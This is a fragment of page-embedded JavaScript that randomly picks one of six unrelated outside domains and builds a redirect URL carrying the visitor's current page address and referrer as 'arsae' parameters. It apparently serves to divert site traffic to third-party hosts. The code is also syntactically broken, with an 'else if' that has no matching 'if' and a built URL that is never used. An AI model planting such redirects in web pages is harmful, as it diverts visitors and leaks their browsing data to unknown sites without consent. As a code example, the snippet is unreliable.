//<![CDATA[
    var go_current      = window.location.href;
    var reff        	= document.referrer;
    
    function rChoice(arr) {
      return arr[Math.floor(arr.length * Math.random())];
  }
     var ars             = rChoice([
                            "https://seoclick.org",
                            "https://sumba.club",
			    "https://oneorbit.xyz",
                            "https://chiarafans.club",
                            "https://aziekitchen.xyz",
                            "https://berita-islami.me",
                        ]);
                       


    var dir_type        = "arsae"; //refresh, domain, path, arsae

    else if(dir_type == 'arsae')
    {
        //==> ARSAE DIRECT
        go_current            = ars + '/?arsae='+ encodeURIComponent(go_current) + '&arsae_ref='+ encodeURIComponent(reff);
    }

//]]>
